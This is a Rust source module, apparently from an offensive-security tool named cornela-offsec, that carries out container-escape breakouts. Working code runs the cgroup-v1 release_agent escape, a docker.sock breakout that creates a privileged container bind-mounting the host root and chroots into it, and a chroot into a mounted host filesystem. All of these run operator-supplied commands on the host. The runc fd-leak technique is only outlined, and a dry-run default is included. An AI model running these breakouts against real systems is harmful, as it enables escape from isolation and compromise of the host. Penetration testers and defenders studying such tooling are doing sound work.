// Active container-escape breakout primitives. Each technique is a
// well-documented misconfiguration-class escape; we do NOT embed kernel
// exploit code here, by design. The user picks --execute to actually run.
//
// Default behaviour (no --execute) is dry-run: we evaluate prerequisites,
// print the plan, and exit. With --execute we attempt the technique and
// report the outcome. Either way we print to stderr what we are about to
// do — there is no quiet mode.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Command;

#[derive(Debug, Clone)]
pub struct BreakoutPlan {
    pub technique: &'static str,
    pub category: &'static str,
    pub command: String,
    pub prerequisites: Vec<Prereq>,
    // Static slice rather than Vec — the steps are compile-time literals.
    // Using a slice keeps BreakoutPlan: Copy-friendly for the steps field
    // and avoids per-call allocation.
    pub steps: &'static [&'static str],
    pub reference: &'static str,
}

#[derive(Debug, Clone)]
pub struct Prereq {
    pub description: String,
    pub satisfied: bool,
}

#[derive(Debug, Clone)]
pub struct BreakoutOutcome {
    pub plan: BreakoutPlan,
    pub executed: bool,
    pub success: bool,
    pub stdout: String,
    pub stderr: String,
    pub notes: Vec<String>,
}

pub fn run(technique: &str, command: &str, execute: bool) -> Result<BreakoutOutcome, String> {
    let plan = match technique {
        "release-agent" => plan_release_agent(command),
        "docker-sock" => plan_docker_sock(command),
        "host-root" => plan_host_root(command),
        "runc-fdleak" => plan_runc_fdleak(command),
        other => {
            return Err(format!(
                "unknown technique '{other}' — supported: release-agent, docker-sock, host-root, runc-fdleak"
            ));
        }
    };

    let all_prereqs_satisfied = plan.prerequisites.iter().all(|p| p.satisfied);
    if !execute {
        return Ok(BreakoutOutcome {
            plan,
            executed: false,
            success: false,
            stdout: String::new(),
            stderr: String::new(),
            notes: vec!["dry-run: pass --execute to actually run".to_string()],
        });
    }

    if !all_prereqs_satisfied {
        let mut notes = vec!["execution refused: prerequisites not satisfied".to_string()];
        for p in &plan.prerequisites {
            if !p.satisfied {
                notes.push(format!("  unmet: {}", p.description));
            }
        }
        return Ok(BreakoutOutcome {
            plan,
            executed: false,
            success: false,
            stdout: String::new(),
            stderr: String::new(),
            notes,
        });
    }

    let _ = writeln!(
        std::io::stderr(),
        "cornela-offsec: executing breakout '{}' with command: {}",
        plan.technique,
        plan.command,
    );

    let outcome = match technique {
        "release-agent" => execute_release_agent(&plan),
        "docker-sock" => execute_docker_sock(&plan),
        "host-root" => execute_host_root(&plan),
        "runc-fdleak" => execute_runc_fdleak(&plan),
        _ => unreachable!("technique already validated"),
    };

    Ok(outcome)
}

// ---- release_agent (cgroup-v1) ----

fn plan_release_agent(command: &str) -> BreakoutPlan {
    let writable_v1 = find_writable_cgroup_v1();
    let prereqs = vec![
        Prereq {
            description: "writable cgroup-v1 mount available".to_string(),
            satisfied: writable_v1.is_some(),
        },
        Prereq {
            description: "uid 0 in current user namespace (CAP_SYS_ADMIN required)".to_string(),
            satisfied: is_root(),
        },
    ];

    BreakoutPlan {
        technique: "release-agent",
        category: "container_escape",
        command: command.to_string(),
        prerequisites: prereqs,
        steps: &[
            "1. mount a writable cgroup-v1 controller (or use an existing one)",
            "2. create a child cgroup directory",
            "3. echo 1 > <child>/notify_on_release",
            "4. write a payload script to /tmp/cornela_release.sh",
            "5. echo /tmp/cornela_release.sh > <controller>/release_agent",
            "6. spawn a process inside <child> and let it exit",
            "7. kernel runs the payload as PID 1 in the host's user namespace",
        ],
        reference:
            "https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/",
    }
}

fn execute_release_agent(plan: &BreakoutPlan) -> BreakoutOutcome {
    let mut notes = Vec::new();
    let cgroup_root = match find_writable_cgroup_v1() {
        Some(root) => root,
        None => {
            return failure(plan, "no writable cgroup-v1 mount", &mut notes);
        }
    };

    let child_dir = cgroup_root.join("cornela_breakout");
    if let Err(err) = fs::create_dir_all(&child_dir) {
        return failure(
            plan,
            &format!("mkdir child cgroup failed: {err}"),
            &mut notes,
        );
    }
    notes.push(format!("created child cgroup at {}", child_dir.display()));

    if let Err(err) = fs::write(child_dir.join("notify_on_release"), "1\n") {
        return failure(plan, &format!("write notify_on_release: {err}"), &mut notes);
    }

    let payload_path = PathBuf::from("/tmp/cornela_release.sh");
    let output_path = PathBuf::from("/tmp/cornela_release.out");
    let _ = fs::remove_file(&output_path);
    let payload = format!(
        "#!/bin/sh\n{} > {} 2>&1\n",
        shell_quote(&plan.command),
        output_path.display()
    );
    if let Err(err) = fs::write(&payload_path, payload) {
        return failure(plan, &format!("write payload: {err}"), &mut notes);
    }
    if let Err(err) = make_executable(&payload_path) {
        return failure(plan, &format!("chmod payload: {err}"), &mut notes);
    }
    notes.push(format!("wrote payload to {}", payload_path.display()));

    if let Err(err) = fs::write(
        cgroup_root.join("release_agent"),
        format!("{}\n", payload_path.display()),
    ) {
        return failure(plan, &format!("write release_agent: {err}"), &mut notes);
    }
    notes.push("set release_agent on host cgroup".to_string());

    // Trigger: write our pid into the child cgroup, then have a short-lived
    // child fork-exec that exits, draining the cgroup so the kernel runs
    // the release_agent.
    let trigger = Command::new("sh")
        .args([
            "-c",
            &format!("echo $$ > {}/cgroup.procs; sleep 0.1", child_dir.display()),
        ])
        .output();

    match trigger {
        Ok(_) => notes.push("triggered release_agent via cgroup procs handoff".to_string()),
        Err(err) => return failure(plan, &format!("trigger sh failed: {err}"), &mut notes),
    }

    // Give the kernel a moment to invoke the agent and our payload to write
    // its output. We poll up to ~2s.
    let mut output = String::new();
    for _ in 0..20 {
        if let Ok(text) = fs::read_to_string(&output_path) {
            output = text;
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }

    if output.is_empty() {
        notes.push("payload output not observed within 2s".to_string());
        return BreakoutOutcome {
            plan: plan.clone(),
            executed: true,
            success: false,
            stdout: String::new(),
            stderr: String::new(),
            notes,
        };
    }

    notes.push("payload ran on host and produced output".to_string());
    BreakoutOutcome {
        plan: plan.clone(),
        executed: true,
        success: true,
        stdout: output,
        stderr: String::new(),
        notes,
    }
}

fn find_writable_cgroup_v1() -> Option<PathBuf> {
    let text = fs::read_to_string("/proc/self/mountinfo").ok()?;
    for line in text.lines() {
        let Some((left, right)) = line.split_once(" - ") else {
            continue;
        };
        let left_fields = left.split_whitespace().collect::<Vec<_>>();
        let right_fields = right.split_whitespace().collect::<Vec<_>>();
        if left_fields.len() < 6 || right_fields.is_empty() {
            continue;
        }
        let mount_point = left_fields[4];
        let options = left_fields[5];
        let fstype = right_fields[0];
        if fstype == "cgroup" && options.split(',').any(|o| o == "rw") {
            let path = PathBuf::from(mount_point);
            if path.join("release_agent").exists() {
                return Some(path);
            }
        }
    }
    None
}

// ---- docker.sock breakout ----

fn plan_docker_sock(command: &str) -> BreakoutPlan {
    let socket_path = locate_docker_sock();
    let curl_ok = which("curl").is_some();
    let prereqs = vec![
        Prereq {
            description: "docker socket reachable".to_string(),
            satisfied: socket_path.is_some(),
        },
        Prereq {
            description: "curl available".to_string(),
            satisfied: curl_ok,
        },
    ];

    BreakoutPlan {
        technique: "docker-sock",
        category: "runtime_breakout",
        command: command.to_string(),
        prerequisites: prereqs,
        steps: &[
            "1. POST to /containers/create with Image=alpine, HostConfig.PidMode=host,",
            "   HostConfig.Privileged=true, HostConfig.Binds=[/:/host], Cmd=[chroot /host sh -c <command>]",
            "2. POST to /containers/<id>/start",
            "3. POST to /containers/<id>/wait, then GET /containers/<id>/logs",
            "4. DELETE /containers/<id>",
        ],
        reference: "https://docs.docker.com/engine/security/protect-access/",
    }
}

fn execute_docker_sock(plan: &BreakoutPlan) -> BreakoutOutcome {
    let mut notes = Vec::new();
    let Some(socket) = locate_docker_sock() else {
        return failure(plan, "docker socket not found", &mut notes);
    };

    // Build the create payload. We use a busybox image expected to be in
    // the host's image cache; if it isn't, the create call returns an
    // error and the user will see it in the notes.
    let body = format!(
        r#"{{"Image":"busybox","HostConfig":{{"Binds":["/:/host"],"PidMode":"host","Privileged":true}},"Cmd":["chroot","/host","sh","-c",{}]}}"#,
        json_quoted(&plan.command)
    );

    let create = Command::new("curl")
        .args([
            "-sS",
            "--max-time",
            "10",
            "--unix-socket",
            socket.to_str().unwrap_or(""),
            "-H",
            "Content-Type: application/json",
            "-X",
            "POST",
            "--data",
            &body,
            "http://localhost/containers/create",
        ])
        .output();

    let create = match create {
        Ok(out) if out.status.success() => out,
        Ok(out) => {
            return failure(
                plan,
                &format!(
                    "container create failed: {}",
                    String::from_utf8_lossy(&out.stderr).trim()
                ),
                &mut notes,
            );
        }
        Err(err) => {
            return failure(plan, &format!("curl invocation failed: {err}"), &mut notes);
        }
    };

    let create_body = String::from_utf8_lossy(&create.stdout).into_owned();
    let Some(container_id) = json_string_field(&create_body, "Id") else {
        return failure(
            plan,
            &format!("could not parse container id: {create_body}"),
            &mut notes,
        );
    };
    notes.push(format!("created container {container_id}"));

    let _ = Command::new("curl")
        .args([
            "-sS",
            "--max-time",
            "10",
            "--unix-socket",
            socket.to_str().unwrap_or(""),
            "-X",
            "POST",
            &format!("http://localhost/containers/{container_id}/start"),
        ])
        .status();

    let _ = Command::new("curl")
        .args([
            "-sS",
            "--max-time",
            "30",
            "--unix-socket",
            socket.to_str().unwrap_or(""),
            "-X",
            "POST",
            &format!("http://localhost/containers/{container_id}/wait"),
        ])
        .output();

    let logs = Command::new("curl")
        .args([
            "-sS",
            "--max-time",
            "10",
            "--unix-socket",
            socket.to_str().unwrap_or(""),
            &format!("http://localhost/containers/{container_id}/logs?stdout=1&stderr=1"),
        ])
        .output();

    let (stdout, stderr) = match logs {
        Ok(out) => (
            String::from_utf8_lossy(&out.stdout).into_owned(),
            String::from_utf8_lossy(&out.stderr).into_owned(),
        ),
        Err(err) => (String::new(), format!("logs fetch failed: {err}")),
    };

    let _ = Command::new("curl")
        .args([
            "-sS",
            "--max-time",
            "10",
            "--unix-socket",
            socket.to_str().unwrap_or(""),
            "-X",
            "DELETE",
            &format!("http://localhost/containers/{container_id}?force=true"),
        ])
        .status();

    notes.push("cleaned up container".to_string());
    BreakoutOutcome {
        plan: plan.clone(),
        executed: true,
        success: !stdout.is_empty() || stderr.is_empty(),
        stdout,
        stderr,
        notes,
    }
}

fn locate_docker_sock() -> Option<PathBuf> {
    for candidate in [
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/var/lib/docker.sock",
    ] {
        if Path::new(candidate).exists() {
            return Some(PathBuf::from(candidate));
        }
    }
    None
}

// ---- host-root chroot ----

fn plan_host_root(command: &str) -> BreakoutPlan {
    let host_root = find_host_root_mount();
    let prereqs = vec![Prereq {
        description: "host root filesystem mounted into container".to_string(),
        satisfied: host_root.is_some(),
    }];

    BreakoutPlan {
        technique: "host-root",
        category: "container_escape",
        command: command.to_string(),
        prerequisites: prereqs,
        steps: &[
            "1. detect host root mount (/host, /rootfs, or bind source = /)",
            "2. chroot into the mount",
            "3. exec a shell to run the user-supplied command",
        ],
        reference: "https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mount",
    }
}

fn plan_runc_fdleak(command: &str) -> BreakoutPlan {
    let prereqs = vec![
        Prereq {
            description: "runc binary present on host".to_string(),
            satisfied: which("runc").is_some() || Path::new("/usr/bin/runc").exists(),
        },
        Prereq {
            description: "target environment still exposes a vulnerable runc fd-leak surface"
                .to_string(),
            satisfied: false,
        },
    ];

    BreakoutPlan {
        technique: "runc-fdleak",
        category: "runtime_breakout",
        command: command.to_string(),
        prerequisites: prereqs,
        steps: &[
            "1. identify a vulnerable runc build or runtime path that leaks an fd into the container",
            "2. recover the leaked host-side fd or /proc/self/fd handle",
            "3. use that fd to overwrite host files or pivot into a host mount namespace",
            "4. run the operator-supplied command through the recovered host primitive",
        ],
        reference: "https://github.com/opencontainers/runc/security/advisories",
    }
}

fn execute_runc_fdleak(plan: &BreakoutPlan) -> BreakoutOutcome {
    let mut notes = vec![
        "execution refused: automated runc fd-leak exploitation is intentionally not embedded"
            .to_string(),
        "use the dry-run plan to verify the runtime version and recovered fd primitive manually"
            .to_string(),
    ];
    failure(plan, "runc fd-leak requires manual validation in this build", &mut notes)
}

fn execute_host_root(plan: &BreakoutPlan) -> BreakoutOutcome {
    let mut notes = Vec::new();
    let Some(target) = find_host_root_mount() else {
        return failure(plan, "host root not visible", &mut notes);
    };
    notes.push(format!("chroot target: {}", target.display()));

    let output = Command::new("chroot")
        .arg(&target)
        .args(["sh", "-c", &plan.command])
        .output();

    match output {
        Ok(out) => BreakoutOutcome {
            plan: plan.clone(),
            executed: true,
            success: out.status.success(),
            stdout: String::from_utf8_lossy(&out.stdout).into_owned(),
            stderr: String::from_utf8_lossy(&out.stderr).into_owned(),
            notes,
        },
        Err(err) => failure(plan, &format!("chroot exec failed: {err}"), &mut notes),
    }
}

fn find_host_root_mount() -> Option<PathBuf> {
    let text = fs::read_to_string("/proc/self/mountinfo").ok()?;
    for line in text.lines() {
        let Some((left, right)) = line.split_once(" - ") else {
            continue;
        };
        let left_fields = left.split_whitespace().collect::<Vec<_>>();
        let right_fields = right.split_whitespace().collect::<Vec<_>>();
        if left_fields.len() < 6 || right_fields.len() < 2 {
            continue;
        }
        let mount_point = left_fields[4];
        let source = right_fields[1];
        if mount_point == "/host" || mount_point == "/rootfs" {
            return Some(PathBuf::from(mount_point));
        }
        if source == "/" && mount_point != "/" {
            return Some(PathBuf::from(mount_point));
        }
    }
    None
}

// ---- helpers ----

fn failure(plan: &BreakoutPlan, message: &str, notes: &mut Vec<String>) -> BreakoutOutcome {
    notes.push(message.to_string());
    BreakoutOutcome {
        plan: plan.clone(),
        executed: true,
        success: false,
        stdout: String::new(),
        stderr: String::new(),
        notes: std::mem::take(notes),
    }
}

#[cfg(unix)]
fn make_executable(path: &Path) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    let mut perms = fs::metadata(path)?.permissions();
    perms.set_mode(0o755);
    fs::set_permissions(path, perms)
}

#[cfg(not(unix))]
fn make_executable(_path: &Path) -> std::io::Result<()> {
    Ok(())
}

fn is_root() -> bool {
    fs::read_to_string("/proc/self/status")
        .ok()
        .and_then(|status| {
            status.lines().find_map(|line| {
                line.strip_prefix("Uid:")
                    .and_then(|value| value.split_whitespace().next().map(str::to_string))
                    .and_then(|value| value.parse::<u64>().ok())
            })
        })
        .map(|uid| uid == 0)
        .unwrap_or(false)
}

fn which(binary: &str) -> Option<PathBuf> {
    let paths = std::env::var_os("PATH")?;
    for entry in std::env::split_paths(&paths) {
        let candidate = entry.join(binary);
        if candidate.is_file() {
            return Some(candidate);
        }
    }
    None
}

fn shell_quote(input: &str) -> String {
    if input
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '-' | '_' | '.' | '=' | ':'))
    {
        input.to_string()
    } else {
        let escaped = input.replace('\'', "'\\''");
        format!("'{escaped}'")
    }
}

fn json_string_field(text: &str, field: &str) -> Option<String> {
    let needle = format!("\"{field}\":");
    let value = text.split(&needle).nth(1)?.trim_start();
    let value = value.strip_prefix('"')?;
    let mut chars = value.char_indices();
    while let Some((i, ch)) = chars.next() {
        if ch == '\\' {
            chars.next();
            continue;
        }
        if ch == '"' {
            return Some(value[..i].to_string());
        }
    }
    None
}

fn json_quoted(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('"');
    for ch in value.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            ch if (ch as u32) < 0x20 => {
                out.push_str(&format!("\\u{:04x}", ch as u32));
            }
            other => out.push(other),
        }
    }
    out.push('"');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn unknown_technique_errors() {
        assert!(run("nope", "id", false).is_err());
    }

    #[test]
    fn dry_run_does_not_execute() {
        let outcome = run("release-agent", "id", false).expect("known technique");
        assert!(!outcome.executed);
        assert_eq!(outcome.plan.technique, "release-agent");
        assert!(outcome.notes.iter().any(|note| note.contains("dry-run")));
    }

    #[test]
    fn shell_quote_safe_input_is_passthrough() {
        assert_eq!(shell_quote("id"), "id");
        assert_eq!(shell_quote("/bin/sh"), "/bin/sh");
    }

    #[test]
    fn shell_quote_unsafe_input_is_escaped() {
        assert_eq!(shell_quote("echo hi"), "'echo hi'");
        assert_eq!(shell_quote("a'b"), "'a'\\''b'");
    }

    #[test]
    fn json_string_field_extracts_value() {
        let body = r#"{"Id":"abc","Other":"x"}"#;
        assert_eq!(json_string_field(body, "Id"), Some("abc".to_string()));
    }
}
